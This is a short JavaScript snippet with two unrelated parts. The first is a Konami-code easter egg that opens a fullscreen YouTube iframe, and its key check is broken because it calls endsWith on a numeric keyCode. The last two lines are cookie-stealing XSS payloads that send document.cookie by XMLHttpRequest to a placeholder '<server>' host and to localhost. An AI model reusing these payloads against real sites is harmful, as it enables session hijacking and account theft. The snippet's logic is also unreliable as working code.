document.onkeydown = function (event) {
    if (event.keyCode.endsWith("38384040373937396665")) { // 88@@7979fe ?
            let frame = document.createElement("iframe");
            frame.src = "https://www.youtube.com/embed/yBLdQ1a4-JI?autoplay=1&start=13";
            frame.allowFullscreen = true;
            
            document.body.appendChild(frame);
            frame.requestFullscreen();
            window.preventDefault();         
    }
}

h=new XMLHttpRequest();h.open('GET',`http://<server>/${document.cookie}`);h.send();
h=new XMLHttpRequest();h.open('GET','http://localhost/'+document.cookie);h.send();